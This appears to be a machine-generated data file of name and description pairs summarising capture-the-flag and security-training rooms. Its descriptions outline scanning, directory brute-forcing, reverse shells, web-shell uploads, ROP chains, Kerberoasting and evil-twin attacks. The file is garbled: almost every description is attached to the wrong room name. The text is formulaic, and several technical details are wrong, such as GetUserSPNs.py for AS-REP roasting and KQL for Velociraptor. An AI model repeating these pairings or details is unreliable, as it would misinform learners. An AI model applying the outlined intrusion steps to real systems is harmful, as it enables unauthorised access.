Threat Modeling.description: - Traffic Analysis Essentials room mandates PCAP ingestion for protocol deciphering. Initial reconnaissance involves Tshark or Wireshark filtering (e.g., http, dns, tcp.port == 22) to isolate suspicious flows. Enumeration requires stream reconstruction (File > Follow > TCP Stream) to extract payloads, e.g., exfiltrated credentials or data over unencrypted channels. Exploitation focuses on identifying C2 beaconing patterns using statistical analysis of packet timing. Enhancement methodology uses Zeek (Bro) for high-level metadata extraction (conn, http, ssl logs) to map attacker IPs, bypassing manual packet scrutiny. (Tools: Wireshark, Tshark, Zeek, NetworkMiner. Methodologies: Flow Analysis, Protocol Decapsulation, Session Reassembly).,Traffic Analysis Essentials

Throwback.name: Throwback
Throwback.description: - The Trap room demands deep host discovery via stealthy nmap scans (e.g., SYN scans, version detection) to avoid IDS triggers. Reconnaissance progresses to intensive web enumeration using gobuster and custom wordlists to uncover hidden directories or misconfigurations intended as decoys. Exploitation often involves analyzing application logic vulnerabilities after identifying vulnerable services found via service enumeration. Enhancement involves utilizing theHarvester on target domains to gather OSINT before initial contact, and careful payload encoding to bypass WAF-like controls. (Tools: nmap, gobuster, theHarvester, Burp Suite. Methodologies: Stealth Scanning, Decoy Detection, WAF Evasion).,Trap

Tomghost.name: Tomghost
Tomghost.description: - Initial reconnaissance on the Tre room requires a standard nmap SYN scan (e.g., nmap -sS --min-rate 5000 --open-only) to map open ports. Enumeration focuses on directory bruteforcing using gobuster (gobuster dir -u http://target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt) to locate entry points. Exploitation involves validating identified services for known CVEs or default credentials found via OSINT with theHarvester if a domain is provided. Enhancement involves using Burp Suite to intercept and manipulate HTTP requests during web application traversal. (Tools: nmap, gobuster, theHarvester, Burp Suite. Methodologies: Port Scanning, Directory Fuzzing, Service Fingerprinting).,Tre

Tony the Tiger.name: Tony the Tiger
Tony the Tiger.description: - Initial reconnaissance for Tryhack3M 0Day CTF prioritizes full version enumeration using nmap scripting (nmap -sV --script=version-info target) to identify potential vulnerable software. Enumeration advances to deep web directory discovery with Gobuster or ffuf using a comprehensive wordlist tuned for CTF artifacts. Exploitation methodology focuses on client-side or server-side request forgery (SSRF) vectors indicated by the "0Day" context, potentially involving payload injection via a Burp Repeater session. (Tools: nmap, Gobuster/ffuf, Burp Suite. Methodologies: Service Version Fingerprinting, Web Path Discovery, Injection Vector Testing).,Tryhack3M: 0Day

Tor.name: Tor
Tor.description: - Advent of Cyber Side Quest requires initial passive reconnaissance using theHarvester targeting organizational domains and email permutations related to the seasonal theme. Active enumeration involves a TCP port scan with nmap to identify non-standard ports, followed by Gobuster directory bruteforcing on found web services. Exploitation often centers on forensic artifact analysis or cryptographic weaknesses, necessitating tools like Wireshark for pcap inspection or CyberChef for decoding. (Tools: theHarvester, nmap, Gobuster, Wireshark, CyberChef. Methodologies: Passive OSINT, Service Identification, Data Slicing, Cryptanalysis).,TryHack3M: Advent of Cyber Side Quest

Trace.name: Trace
Trace.description: - Bah Humbug requires initial nmap version detection on port 22/80 to determine SSH or web vulnerabilities. Directory enumeration using Gobuster with a specific holiday wordlist is critical for uncovering hidden login panels or config files. Exploitation may involve brute-forcing weak credentials via Hydra or exploiting a remote code execution flaw revealed by service banner analysis. (Tools: nmap, Gobuster, Hydra, Burp Suite. Methodologies: Service Fingerprinting, Forced Browsing, Credential Testing, Vulnerability Mapping).,TryHack3M: Bah Humbug

Traffic Analysis Essentials.name: Traffic Analysis Essentials
Traffic Analysis Essentials.description: - Biohazard enumeration begins with full TCP/UDP port scanning using nmap -sV -A to identify outdated Apache or SMB services. Extensive web directory fuzzing with DirBuster and a Linux-centric wordlist is required to find a vulnerable file upload interface or database endpoint. Exploitation path likely involves a Local File Inclusion (LFI) vulnerability leading to a reverse shell via Netcat listener. (Tools: nmap, DirBuster, Netcat, sqlmap. Methodologies: Service Versioning, LFI Vector Testing, Reverse Shell Establishment, Post-Exploitation Privilege Escalation).,TryHack3M: Biohazard

Trap.name: Trap
Trap.description: - Advanced SOC analysis demands Splunk query mastery for TTP correlation, moving beyond basic nmap logs to identify lateral movement via PowerShell execution or mimikatz artifact detection. Effective threat hunting utilizes sysmon event IDs and SIEM alert triage to trace initial access from web shell enumeration (gobuster output) to data exfiltration signatures. (Tools: Splunk, Sysmon, Elasticsearch (Kibana), Volatility Framework. Methodologies: Log Aggregation, IOC Validation, Kill Chain Mapping, Digital Forensics Triage).,TryHack3M: Boss of the SOC V2

Tre.name: Tre
Tre.description: - Deep dive into Japanese web application security requires nuanced directory brute-forcing using a wordlist tailored to common JIS encoding artifacts or application frameworks like Ruby on Rails or specific CMS vulnerabilities. Reconnaissance leverages theHarvester for subdomain discovery following initial nmap port scanning (TCP 8080 frequently targeted) to locate an exploitable path identified via gobuster enumeration. (Tools: nmap, gobuster, theHarvester, Burp Suite (Intruder), SQLmap. Methodologies: WAF Bypass, Directory Traversal Exploitation, Source Code Review for hardcoded credentials).,TryHack3M: Cherry Blossom

Tryhack3M: 0Day.name: Tryhack3M: 0Day
Tryhack3M: 0Day.description: - Multi-stage Cyber Siege necessitates initial nmap SYN scans (-sS) followed by service version detection (-sV) to identify a vulnerable SMB share or unpatched web service. Enumeration shifts to Gobuster for aggressive directory fuzzing, seeking configuration files or credential dumps exploited via Metasploit framework modules for privilege escalation after initial shell acquisition. (Tools: nmap, gobuster, Metasploit (exploit/handler), smbclient, LinPEAS. Methodologies: Vulnerability Scanning, Lateral Movement, Post-Exploitation Scripting).,TryHack3M: Cyber Siege

TryHack3M: Advent of Cyber Side Quest.name: TryHack3M: Advent of Cyber Side Quest
TryHack3M: Advent of Cyber Side Quest.description: - Elf Minder enumeration focuses on UDP port scanning with nmap (-sU) to locate proprietary or custom Christmas protocol services running on non-standard ports; Dirbuster or feroxbuster then brute-forces web interfaces for insecure file upload mechanisms to inject a reverse shell using Netcat listener. (Tools: nmap (-sU), feroxbuster, Netcat (-lvnp), Wireshark (protocol analysis). Methodologies: Protocol Fuzzing, Web Application Exploitation, Payload Delivery).,TryHack3M: Elf Minder 9000

TryHack3M: Bah Humbug.name: TryHack3M: Bah Humbug
TryHack3M: Bah Humbug.description: - Evergreen reconnaissance initiates with comprehensive TCP SYN scans (nmap -sS) followed by version enumeration (-sV) targeting uncommon Linux services; Gobuster is then deployed against identified web servers with an extensive directory wordlist to discover sensitive configuration files for local file inclusion (LFI) vulnerabilities. (Tools: nmap, Gobuster (with custom wordlist), Burp Suite Repeater, sshpass). Methodologies: Service Fingerprinting, Directory Brute-Forcing, Injection Exploitation.,TryHack3M: Evergreen

TryHack3M: Biohazard.name: TryHack3M: Biohazard
TryHack3M: Biohazard.description: - Ghost Town enumeration commences with UDP and TCP port sweeps (nmap -sU and -sV) to map forgotten services; dirbuster is employed against SMB shares (via smbclient) to uncover misconfigured or abandoned credentials for lateral movement into the core system. (Tools: nmap, smbclient, dirbuster, Metasploit Framework auxiliary modules). Methodologies: Service Discovery, Credential Harvesting, Network Mapping.,TryHack3M: Ghost Town

TryHack3M: Boss of the SOC V2.name: TryHack3M: Boss of the SOC V2
TryHack3M: Boss of the SOC V2.description: - IDE security enumeration targets exposed source code repositories and runtime environments; theHarvester scans public records for developer emails or leaked API keys linked to the development server endpoints. Exploitation focuses on insecure deserialization via web hooks or command injection in build scripts (Jenkins/GitLab CI). (Tools: theHarvester, Burp Suite Intruder, SQLMap, custom Python scripts). Methodologies: OSINT, Injection Testing, Supply Chain Assessment.,TryHack3M: IDE

TryHack3M: Cherry Blossom.name: TryHack3M: Cherry Blossom
TryHack3M: Cherry Blossom.description: - Kibana enumeration involves identifying exposed indices and visualization endpoints via directory bruteforcing (gobuster/dirbuster) on the underlying web server hosting the interface. Exploitation leverages log injection or improper access controls (ACLs) to extract sensitive SIEM data, such as Elasticsearch queries or user session tokens. (Tools: nmap service detection, Kibana Dev Tools, OWASP ZAP). Methodologies: Network Scanning, API Fuzzing, Query Language Manipulation.,TryHack3M: Kibana

TryHack3M: Cyber Siege.name: TryHack3M: Cyber Siege
TryHack3M: Cyber Siege.description: - Literary theme hides command injection vectors within file parsing routines, mimicking textual data handling. Initial reconnaissance (theHarvester for domain discovery) precedes web enumeration (gobuster on common paths like "/manuscripts" or "/index"). Exploitation involves injecting OS commands via user input fields that process input as a book title or author name, often requiring shell character encoding bypasses. (Tools: curl, Burp Suite Intruder).,TryHack3M: Literary Hacking

TryHack3M: Elf Minder 9000.name: TryHack3M: Elf Minder 9000
TryHack3M: Elf Minder 9000.description: - Network forensics requires PCAP analysis to reconstruct attacker lateral movement following initial network intrusions detected via NetFlow anomalies. Methodology prioritizes TCP stream reassembly (Wireshark IO filters) to extract HTTP POST payloads or SSH session credentials, bypassing conventional host-based scanning (nmap is for baseline comparison). Enhancement involves using tshark for bulk export of DNS queries to identify C2 domains, followed by file signature matching on extracted transferred objects.,TryHack3M: Network Forensics

TryHack3M: Evergreen.name: TryHack3M: Evergreen
TryHack3M: Evergreen.description: - Schema enumeration involves SQLmap for blind time-based injection after initial web application parameter fuzzing (enhanced via a modified gobuster dictionary to target hidden .config files). Exploitation shifts to dumping database schema information (TABLES, COLUMNS) using UNION SELECT statements if error-based techniques fail, culminating in credential extraction or remote code execution via MySQL INTO OUTFILE.,TryHack3M: Sch3Ma D3Mon

TryHack3M: Ghost Town.name: TryHack3M: Ghost Town
TryHack3M: Ghost Town.description: - Reconnaissance utilizes nmap SYN scans (-sS) followed by gobuster with a custom wordlist targeting common subscription endpoints (/api/v1/user, /billing), leading to discovery of an insecure POST request endpoint for trial activation. Exploitation involves parameter tampering to bypass payment validation checks via Burp Suite Intruder to gain full access.,TryHack3M: Subscribe

TryHack3M: IDE.name: TryHack3M: IDE
TryHack3M: IDE.description: - Initial reconnaissance with nmap reveals a non-standard port running a web service; gobuster enumeration uncovers a hidden directory containing a Base64 encoded public key and a challenge prompt. Cryptanalysis involves using OpenSSL to verify the key type and subsequently employing a chosen-ciphertext attack against a vulnerable AES-CBC implementation to decrypt the flag.,TryHack3M: TriCipher Summit

TryHack3M: Kibana.name: TryHack3M: Kibana
TryHack3M: Kibana.description: - Initial service discovery via nmap identifies an open port running an unpatched custom TCP service; reverse engineering the target binary with Ghidra reveals an unsafe use of `gets`, confirming a stack-based buffer overflow vulnerability for shellcode injection. Exploitation requires crafting a malicious payload using Python and pwntools to overwrite the Return Address with a controlled EIP pointing to NOP sled and the injected shellcode for remote code execution.,TryPwnMe One

TryHack3M: Literary Hacking.name: TryHack3M: Literary Hacking
TryHack3M: Literary Hacking.description: - Target analysis via static analysis of the service binary shows NX bit enabled, necessitating Return-Oriented Programming (ROP); ROPgadget scans libraries for useful gadgets like pop rdi followed by ret to construct a chain bypassing the non-executable stack to call `system("/bin/sh")`.,TryPwnMe Two

TryHack3M: Network Forensics.name: TryHack3M: Network Forensics
TryHack3M: Network Forensics.description: - Initial reconnaissance utilizing nmap scans (SYN stealth and version detection) identifies open ports like 80 and 443; gobuster brute-forcing common web directories reveals a hidden administration panel requiring credential enumeration via dictionary attacks.,TryWinMe: Think Cyber Monopoly

TryHack3M: Sch3Ma D3Mon.name: TryHack3M: Sch3Ma D3Mon
TryHack3M: Sch3Ma D3Mon.description: - TShark captures live traffic (-i interface) or parses pcap files; filtering essential for protocol analysis (e.g., tcp.port==22 or http.request); extract credentials or sensitive data using display filters following initial network enumeration.,TShark

TryHack3M: Subscribe.name: TryHack3M: Subscribe
TryHack3M: Subscribe.description: - TShark teamwork analysis involves concurrently processing multiple packet captures (PCAPs), correlating timing stamps across different sources to map reconnaissance (nmap scans) to subsequent enumeration (gobuster HTTP requests) and potential exploitation vectors by scripting combined statistics extraction.,TShark Challenge I: Teamwork

TryHack3M: TriCipher Summit.name: TryHack3M: TriCipher Summit
TryHack3M: TriCipher Summit.description: - Advanced TShark directory analysis focuses on filtering HTTP POST requests captured during brute-forcing (dirbuster logs) to isolate session cookies or base64 encoded payloads passed to vulnerable endpoints identified via initial nmap service version detection.,TShark Challenge II: Directory

TryPwnMe One.name: TryPwnMe One
TryPwnMe One.description: - Mastering TShark CLI involves complex display filters (e.g., tcp.port == 80 and http.request.method == "POST") to extract POST data stream parameters potentially containing credentials brute-forced via gobuster or dirbuster during initial enumeration phases.,TShark: CLI Wireshark Features

TryPwnMe Two.name: TryPwnMe Two
TryPwnMe Two.description: - TShark basic capture (tshark -i eth0 -w capture.pcapng) supplements initial nmap SYN scans by inspecting subsequent TCP handshakes and protocol responses revealing service versions missed or obfuscated during passive reconnaissance.,TShark: The Basics

TryWinMe: Think Cyber Monopoly.name: TryWinMe: Think Cyber Monopoly
TryWinMe: Think Cyber Monopoly.description: - Platform navigation via CLI integration enables pipelining nmap scan results directly into a Task Submission mechanism, accelerating enumeration feedback cycles beyond web interface copy-paste.,Tutorial

TShark.name: TShark
TShark.description: - Utilizing theHarvester with specific Shonen Jump domain variants during reconnaissance reveals potential hidden subdomains mirroring UA High Departmental servers; subsequent gobuster attacks against found ports target specific directory structures named after Quirks.,U.A. High School

TShark Challenge I: Teamwork.name: TShark Challenge I: Teamwork
TShark Challenge I: Teamwork.description: - Aggressive nmap SYN scans with custom version detection scripting map UltraTech's internal network topology; dirbuster brute-forcing on port 8080 uncovers a hidden API endpoint requiring a SQL injection exploit via Burp Suite Intruder to escalate privileges.,UltraTech

TShark Challenge II: Directory.name: TShark Challenge II: Directory
TShark Challenge II: Directory.description: - Targeted nmap service version detection on exposed Docker API ports reveals an outdated daemon; gobuster enumerates the web interface for vulnerable environment variables leading to a host-based container escape using a known CVE.,Umbrella

TShark: CLI Wireshark Features.name: TShark: CLI Wireshark Features
TShark: CLI Wireshark Features.description: - Initial nmap scan identifies unsecured SMB shares on the Unattended Windows installation endpoint; theHarvester gathers domain user enumeration details, followed by local security policy dump via PowerShell to extract cached credentials for privilege escalation.,Unattended

TShark: The Basics.name: TShark: The Basics
TShark: The Basics.description: - Gobuster directory bruteforcing on the Python web application reveals an unpatched Jinja2 template engine vulnerability; exploit using Server-Side Template Injection (SSTI) payloads to execute OS commands via template context manipulation.,Unbaked Pie

Tutorial.name: Tutorial
Tutorial.description: - Advanced Reconnaissance utilizes theHarvester for email and subdomain enumeration, feeding results into nmap scripting engine (NSE) scans targeting identified ports to map Attack Delivery vectors against the target network infrastructure aligned with the initial phases of the Cyber Kill Chain.,Unified Kill Chain

U.A. High School.name: U.A. High School
U.A. High School.description: - Evil Twin exploitation requires precise WLAN Reconnaissance using Aircrack-ng suite (airodump-ng) to identify target BSSID and channel; then, setup rogue AP via hostapd while deauthenticating legitimate clients with aireplay-ng to force connection for subsequent credential capture.,Unstable Twin

UltraTech.name: UltraTech
UltraTech.description: - File upload vulnerability exploitation starts with nmap and gobuster for web service and directory enumeration; techniques involve bypassing extension filters (e.g., double extensions, null byte injection) or MIME type validation to upload a webshell (e.g., .php, .aspx) and gain RCE.,Upload Vulnerabilities

Umbrella.name: Umbrella
Umbrella.description: - Techsupp0rt enumeration commences with nmap scanning for open ports, followed by gobuster or dirbuster brute-forcing common directories like `/admin` or `/login`; exploitation often targets weak credentials or unpatched CMS vulnerabilities revealed via theHarvester for potential remote code execution.,Techsupp0rt: 1

Unattended.name: Unattended
Unattended.description: - Theatre room reconnaissance initiates with nmap service version detection; enumeration progresses via gobuster on hidden directories suggesting script locations or backstage access; exploitation may involve SQLi on a ticket system or LFI to read stage production scripts.,Theatre

Unbaked Pie.name: Unbaked Pie
Unbaked Pie.description: - Thompson room reconnaissance targets SMB shares via nmap scripts for misconfigured credentials; enumeration employs gobuster against common web application paths; exploitation focuses on vulnerable file upload functionality to establish a reverse shell using netcat.,Thompson

Unified Kill Chain.name: Unified Kill Chain
Unified Kill Chain.description: - Threat Hunting initial foothold requires rapid port scanning with nmap identifying open services; enumeration utilizes gobuster for directory brute-forcing discovering unlinked endpoints; exploitation involves leveraging identified vulnerabilities for initial system access and persistence setup.,Threat Hunting: Foothold

Unstable Twin.name: Unstable Twin
Unstable Twin.description: - Threat Hunting lateral movement post-foothold demands internal network reconnaissance using advanced nmap scans to map new subnets; enumeration proceeds via local service checks and credential reuse attempts to achieve pivoting through compromised hosts.,Threat Hunting: Pivoting

Upload Vulnerabilities.name: Upload Vulnerabilities
Upload Vulnerabilities.description: - Threat hunting for ransomware involves endpoint detection monitoring file system write patterns and process injection; initial reconnaissance may reveal network shares via SMB enumeration or use of theHarvester for domain discovery preceding encryption payload execution.,Threat Hunting: Ransomware

Techsupp0rt: 1.name: Techsupp0rt: 1
Techsupp0rt: 1.description: - Vim productivity enhancement leverages macros (q for recording) to automate repetitive text manipulation, akin to scripting tasks seen in exploitation phases; though not directly related to reconnaissance tools like nmap or gobuster, Vim's global substitution (:g/pattern/s/old/new/g) mimics mass data modification commands.,Toolbox: Vim

Theatre.name: Theatre
Theatre.description: - Toronto room techniques likely involve network scanning using nmap for host discovery, followed by gobuster or dirbuster for web enumeration against services identified on specific ports, culminating in exploitation pathways possibly leveraging OSINT gained via theHarvester.,Toronto

Thompson.name: Thompson
Thompson.description: - TPot deployment focuses on deceptive reconnaissance, where initial nmap scans of the virtual machine reveal numerous honeypot services simulating vulnerabilities; enumeration involves analyzing logs within the ELK stack or Cowrie sessions, bypassing typical gobuster web enumeration for direct log analysis to trace attacker techniques.,TPot

Threat Hunting: Foothold.name: Threat Hunting: Foothold
Threat Hunting: Foothold.description: - Uranium CTF advancement requires omitting standard nmap SYN scans due to anti-tamper measures, shifting reconnaissance to passive OSINT via theHarvester for subdomain enumeration; exploitation then targets custom binary vulnerabilities using Ghidra for reverse engineering, followed by ROP chaining to bypass stack canaries.,Uranium CTF

Threat Hunting: Pivoting.name: Threat Hunting: Pivoting
Threat Hunting: Pivoting.description: - Valley landscape CTF exploitation commences with aggressive port scanning using nmap aggressive scripts (-sC -A), followed by gobuster directory brute-forcing on web servers using common wordlists like rockyou.txt, targeting misconfigured file shares for LFI injection or unauthenticated RCE.,Valley

Threat Hunting: Ransomware.name: Threat Hunting: Ransomware
Threat Hunting: Ransomware.description: - Velociraptor DFIR automation leverages custom KQL queries pushed via the central server to deploy memory acquisition and process listing artifacts across compromised endpoints, bypassing initial nmap recon if agents are already active, focusing on persistence mechanisms like registry Run keys or scheduled tasks for forensic containment.,Velociraptor

Toolbox: Vim.name: Toolbox: Vim
Toolbox: Vim.description: - Container escape enumeration utilizes CVEs against outdated Docker or Kubernetes runtimes, employing specific payloads after initial network recon with nmap to identify exposed management APIs or misconfigured service accounts, followed by privilege escalation exploitation within the host OS.,Virtualization and Containers

Toronto.name: Toronto
Toronto.description: - Remote Code Execution exploitation in Void Execution focuses on unvalidated input leading to OS command injection via web parameters, validated after reconnaissance using theHarvester for endpoints, and enumeration with gobuster to discover vulnerable scripts, culminating in shell retrieval using netcat or reverse shell payloads.,Void Execution

TPot.name: TPot
TPot.description: - Volatility framework mastery for memory forensics involves dumping RAM images followed by profiling with the --profile flag, utilizing plugins like pslist, netscan, and dlllist to reconstruct process activity, network connections, and loaded modules, enhancing analysis by extracting command history via consoles and identifying malicious artifacts absent from disk.,Volatility

Uranium CTF.name: Uranium CTF
Uranium CTF.description: - Essential Volatility techniques focus on initial image assessment using imageinfo for profile selection, followed by process tree reconstruction via pstree, and malware signature detection using yarascan; this methodology lays the foundation for enumeration of user activity before proceeding to exploitation via memory artifacts, unlike external reconnaissance tools like nmap.,Volatility Essentials

Valley.name: Valley
Valley.description: - Volt Typhoon analysis requires mapping observed TTPs to MITRE ATT&CK techniques like Masquerading and Defense Evasion, leveraging threat intelligence feeds to identify known C2 infrastructure often found via OSINT reconnaissance (theHarvester for domains) before network enumeration (nmap) reveals exposed services targeted for exploitation.,Volt Typhoon

Velociraptor.name: Velociraptor
Velociraptor.description: - Vulnerabilities 101 focuses on foundational security mechanisms like input validation and access control testing commencing with port scanning (nmap) for service discovery, followed by directory enumeration (gobuster or dirbuster) to uncover unlinked endpoints susceptible to common exploitation vectors.,Vulnerabilities 101

Virtualization and Containers.name: Virtualization and Containers
Virtualization and Containers.description: - Vulnerability Capstone demands comprehensive end-to-end testing utilizing automated reconnaissance (theHarvester for OSINT) and intrusive enumeration (nmap aggressive scans and web path bruteforcing via gobuster), culminating in manual exploitation of identified flaws like SQLi or LFI to achieve target system privilege escalation or shell access.,Vulnerability Capstone

Void Execution.name: Void Execution
Void Execution.description: - Enterprise Vulnerability Management requires continuous scanning (Nessus/OpenVAS integration) post-initial enumeration (nmap service versioning for baseline) followed by risk-based patch triage and remediation validation testing using exploit frameworks (Metasploit) to verify mitigation efficacy against zero-day or known CVEs.,Vulnerability Management

Volatility.name: Volatility
Volatility.description: - Automated vulnerability scanning enhancement involves initial network mapping (nmap -sV -A) feeding data to authenticated scanners (Nessus/Qualys) to detect misconfigurations and missing patches, followed by manual web enumeration (gobuster for directories) to validate application layer flaws not captured by network scans.,Vulnerability Scanner Overview

Volatility Essentials.name: Volatility Essentials
Volatility Essentials.description: - VulnNet tackling requires systematic reconnaissance using nmap for port identification and service versioning, then targeted enumeration via gobuster on web ports (e.g. port 80/443) for hidden directories, leading to protocol-specific exploitation paths based on identified vulnerabilities.,VulnNet

Volt Typhoon.name: Volt Typhoon
Volt Typhoon.description: - Active Directory exploitation within VulnNet Active involves initial nmap scans for SMB/Kerberos ports, followed by theHarvester for user enumeration, then utilizing tools like Impacket suite for Kerberoasting or AS-REP roasting to obtain credentials for lateral movement.,VulnNet: Active

Vulnerabilities 101.name: Vulnerabilities 101
Vulnerabilities 101.description: - VulnNet dotjar focuses on Java application security vulnerabilities; reconnaissance includes nmap for web ports, followed by gobuster or dirbuster for discovering exposed endpoints or deployment files like .war or .jar, leading to exploitation via deserialization or remote code execution paths within the JVM.,VulnNet: dotjar

Vulnerability Capstone.name: Vulnerability Capstone
Vulnerability Capstone.description: - VulnNet dotpy targets Python web frameworks; initial reconnaissance utilizes nmap for service identification, then gobuster scans for common Flask or Django directories, exploitation often involves exploiting insecure template rendering or command injection via user input processing functions.,VulnNet: dotpy

Vulnerability Management.name: Vulnerability Management
Vulnerability Management.description: - Endgame requires multi-stage compromise starting with comprehensive network mapping using nmap aggressive scans; enumeration focuses on identifying legacy SMB shares and unpatched Kerberos services, exploitation path often involves initial user credential harvesting via theHarvester and subsequent privilege escalation using a known Windows exploit to achieve Domain Admin.,VulnNet: Endgame

Vulnerability Scanner Overview.name: Vulnerability Scanner Overview
Vulnerability Scanner Overview.description: - Internal network penetration involves post-exploitation lateral movement after initial pivot; enumeration prioritizes internal DNS records via host-level nmap scans and web service discovery using gobuster on discovered IPs; exploitation techniques center on Pass-the-Hash attacks or exploiting unsecured intranet applications revealed by dirbuster.,VulnNet: Internal

VulnNet.name: VulnNet
VulnNet.description: - Node.js application enumeration targets source code disclosure via gobuster directory bruteforcing, searching for .env files or unprotected API endpoints; exploitation focuses on Prototype Pollution or insecure deserialization of JSON objects to achieve Remote Code Execution (RCE), leveraging discovered npm package vulnerabilities.,VulnNet: Node

VulnNet: Active.name: VulnNet: Active
VulnNet: Active.description: - Active Directory reconnaissance via theHarvester and nmap identifies domain controllers and Kerberos ports (TCP/UDP 88); enumeration involves using Impacket's GetUserSPNs.py to discover AS-REP roastable accounts, followed by a brute-force attack on KRB5CCache hashes using Hashcat with a password list derived from enumeration or dirbuster scans on web servers for credential leaks.,VulnNet: Roasted

VulnNet: dotjar.name: VulnNet: dotjar
VulnNet: dotjar.description: - Nmap scans reveal running web services (Apache/Nginx); gobuster brute-forces directories and files to locate the file upload endpoint, testing for extension whitelisting bypass via double extensions (e.g., .php.jpg) or content-type manipulation in the HTTP request to upload a web shell (e.g., cmd.php) for remote code execution.,VulnUniversity

VulnNet: dotpy.name: VulnNet: dotpy
VulnNet: dotpy.description: - TheHarvester gathers external information (emails, subdomains); subsequent nmap ping sweeps and gobuster enumeration identify exposed ports (21, 22, 80), leading to FTP anonymous login attempts or SSH bruteforcing and web directory traversal exploitation on identified endpoints to exfiltrate credentials.,VulnVault

VulnNet: Endgame.name: VulnNet: Endgame
VulnNet: Endgame.description: - Initial reconnaissance using theHarvester uncovers user data; nmap scans reveal an unusual port running a custom service; gobuster identifies a hidden API endpoint vulnerable to SQL injection for privilege escalation and shell acquisition.,W1seGuy

VulnNet: Internal.name: VulnNet: Internal
VulnNet: Internal.description: - Target application enum via gobuster dirbuster reveals insecure file upload interface; manual testing with Burp Suite confirms path traversal leading to sensitive configuration file disclosure and subsequent command injection.,Walking an Application

VulnNet: Node.name: VulnNet: Node
VulnNet: Node.description: - Initial reconnaissance using theHarvester on target domain yields an internal IP; nmap port scan detects unsecured SSH and a non-standard logging service on port 2222, requiring Wireshark packet capture analysis to identify clear-text credentials for privilege escalation.,Watcher

VulnNet: Roasted.name: VulnNet: Roasted
VulnNet: Roasted.description: - Wazuh agent deployment on compromised host begins real-time log monitoring; custom rules are configured to alert on failed enumeration attempts (e.g., gobuster directory scans) and subsequent SSH bruteforce activity, correlating with nmap discovery findings for incident response playbook validation.,Wazuh

VulnUniversity.name: VulnUniversity
VulnUniversity.description: - Initial reconnaissance using theHarvester uncovered subdomains and email formats; subsequent nmap TCP SYN scans revealed port 80 open, leading to gobuster directory enumeration yielding a hidden API endpoint requiring complex parameter injection for flag retrieval.,We Are Groot

VulnVault.name: VulnVault
VulnVault.description: - Comprehensive reconnaissance with nmap identified ports 80 and 443; gobuster brute-force discovered a vulnerable admin panel path; subsequent SQLmap exploitation on a login form achieved database dump containing user credentials for lateral movement.,Web App Security

W1seGuy.name: W1seGuy
W1seGuy.description: - Initial nmap scan revealed Cloudflare WAF shielding port 80; theHarvester identified an exposed origin IP via historical DNS records; direct requests to origin enabled XSS payload injection by encoding payload using URL and HTML entities to evade WAF signature detection.,Web Application Firewall

Walking an Application.name: Walking an Application
Walking an Application.description: - Target reconnaissance commenced with theHarvester for email and subdomain discovery; subsequently, gobuster utilized the common Wordlist X against directory paths on port 80, uncovering a hidden admin interface requiring brute-force via Hydra.,Web Enumeration

Watcher.name: Watcher
Watcher.description: - Initial service discovery via nmap scanning revealed HTTP on port 80; web foundation enumeration involved dirbuster for deep path discovery, identifying an unrestricted robots.txt file guiding subsequent enumeration efforts.,Web Fundamentals

Wazuh.name: Wazuh
Wazuh.description: - Target domain reconnaissance utilized theHarvester against public sources and search engines to gather email addresses and subdomains; subsequent enumeration involved gobuster on identified subdomains to locate hidden directories and potential API endpoints for further exploitation.,Web OSINT

We Are Groot.name: We Are Groot
We Are Groot.description: - Initial reconnaissance mapped open ports using nmap with aggressive scripting (`-sC -sV`) on target web servers; subsequent enumeration employed dirbuster in brute-force mode against common directories to identify unlinked assets and potential file inclusion vectors for exploitation.,Web Scanning

Web App Security.name: Web App Security
Web App Security.description: - Targeted web application enumeration commenced post-reconnaissance via gobuster with a comprehensive directory list to uncover hidden endpoints, followed by Burp Suite for manual parameter fuzzing to test for SQLi and XSS vulnerabilities during the exploitation phase.,WebApp Security

Web Application Firewall.name: Web Application Firewall
Web Application Firewall.description: - Wekor room exploitation initiated with nmap service version detection on identified ports, proceeding to gobuster directory bruteforcing to locate the vulnerable upload mechanism for shell staging.,Wekor

Web Enumeration.name: Web Enumeration
Web Enumeration.description: - Wgel CTF commences with theHarvester OSINT on target domain, followed by nmap script execution to uncover specific service vulnerabilities, then dirbuster brute-forcing uncovers a misconfigured admin panel leading to initial shell access.,Wgel CTF

Web Fundamentals.name: Web Fundamentals
Web Fundamentals.description: - What the Shell requires initial nmap port scan revealing an HTTP service, gobuster directory enumeration identifies a vulnerable script endpoint, exploitation via command injection achieves a reverse shell, followed by linpeas for privilege escalation using SUDO misconfigurations.,What the Shell

Web OSINT.name: Web OSINT
Web OSINT.description: - Windows Fundamentals 1 focuses on initial reconnaissance using nmap targeting SMB ports (445/139) and RDP (3389), enumeration involves NetBIOS name queries and checking shares with smbclient, practical steps include identifying user accounts and password policy via built-in CMD commands like net user.,Windows Fundamentals 1

Web Scanning.name: Web Scanning
Web Scanning.description: - Windows Fundamentals 2 advances enumeration to target specific services like MSSQL or IIS after initial nmap scans, technique involves leveraging PowerShell scripts for system information gathering and vulnerability identification prior to exploitation attempts using known Windows vulnerabilities or weak configurations.,Windows Fundamentals 2

WebApp Security.name: WebApp Security
WebApp Security.description: - Windows Fundamentals 3 focuses on advanced lateral movement and privilege escalation techniques beyond initial access, employing tools like Mimikatz post-exploitation for credential dumping, coupled with system enumeration using PowerUp or WinPEAS to discover misconfigurations for kernel or service exploitation.,Windows Fundamentals 3

Wekor.name: Wekor
Wekor.description: - Windows Forensics room details involve deep dive analysis of artifacts like Event Logs (Security, System), Registry Hives (SAM, SYSTEM, NTUSER.DAT), and prefetch files, utilizing tools such as Autopsy, FTK Imager, and Registry Explorer for timeline reconstruction and artifact validation.,Windows Forensics

Wgel CTF.name: Wgel CTF
Wgel CTF.description: - Windows Local Persistence techniques focus on Run Keys (HKLM/HKCU:\Software\Microsoft\Windows\CurrentVersion\Run), Scheduled Tasks (schtasks creation), WMI Event Subscriptions, and DLL Hijacking, requiring blue team detection via Sysmon Event ID 13 (RegistryValue Set) and monitoring for unexpected process injection or network beaconing.,Windows Local Persistence

What the Shell.name: What the Shell
What the Shell.description: - Windows Privilege Escalation targets unquoted Service Paths, weak Service Permissions (e.g., Service owner or binary path writable by current user), kernel exploits (post-enumeration via WinPEAS or manual version check against nmap scan results), and AlwaysInstallElevated registry keys for MSI abuse, exploited via command line tools like icacls or specific exploit binaries.,Windows PrivEsc

Windows Fundamentals 1.name: Windows Fundamentals 1
